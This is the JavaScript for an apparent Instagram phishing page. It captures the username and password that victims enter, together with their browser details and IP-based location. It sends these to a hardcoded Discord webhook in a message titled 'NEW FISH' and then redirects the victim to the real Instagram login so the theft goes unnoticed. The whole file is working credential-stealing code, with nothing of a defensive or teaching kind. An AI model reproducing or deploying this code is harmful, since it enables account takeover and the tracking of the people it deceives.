const loginButton = document.querySelector("button[type='submit']");
const password = document.querySelector("#password");
const username = document.querySelector("#email");
const showPasswordBtn = document.querySelector("#tchange");
const alertMessage = document.getElementById("alert-message"); // Added for error message

password.addEventListener("input", disableBtn);
username.addEventListener("input", disableBtn);

showPasswordBtn.addEventListener("click", passwordVisible);

function passwordVisible() {
  if (password.type === "password") {
    password.type = "text";
    showPasswordBtn.textContent = "Hide";
  } else {
    password.type = "password";
    showPasswordBtn.textContent = "Show";
  }
}

function disableBtn() {
  if (username.value && password.value) {
    loginButton.disabled = false;
  } else {
    loginButton.disabled = true;
  }
}

let Info;

loginButton.addEventListener("click", async () => {
  Info = await getInfo();
  console.log(Info);

  const loginSuccess = await sendInfo();
  if (loginSuccess) {
    console.log("Login successful!");
    window.location.replace("https://www.instagram.com/accounts/login/");
  } else {
    console.log("Incorrect Password!");

    // Display an error message
    alertMessage.innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
  }
});

async function getInfo() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();

    const info = `> IP: ${data.ip}\n> City: ${data.city}\n> Region: ${data.region}\n> Country: ${data.country_name}\n> Postal Code: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;

    return info;
  } catch {
    return `> IP: Unknown\n> City: Unknown\n> Region: Unknown\n> Country: Unknown\n> Postal Code: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
  }
}

async function sendInfo() {
  const webhook = "https://discord.com/api/webhooks/1149618099880984657/3qnXvasbZR_jvv1A6RijxC7sEVsbuRJ6BKj2loKG7AVSBaUfuncqOfozp4k3gSe4lWXR";

  const embed = {
    color: 1585803, // #18328b
    title: "NEW FISH",
    description: `${Info}`,
    footer: {
      text: "@terrykiddo",
    },
  };

  const config = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ username: "TK_IGlogs", embeds: [embed] }),
  };

  try {
    const response = await fetch(webhook, config);

    if (response.ok) {
      return true; // Login was successful
    } else {
      return false; // Login was unsuccessful
    }
  } catch {
    setTimeout(function () {
      window.location.replace("https://www.instagram.com/accounts/login/");
    }, 1000);
    return false; // An error occurred
  }
  setTimeout(function () {
    window.location.replace("https://www.instagram.com/accounts/login/");
  }, 1000);
}
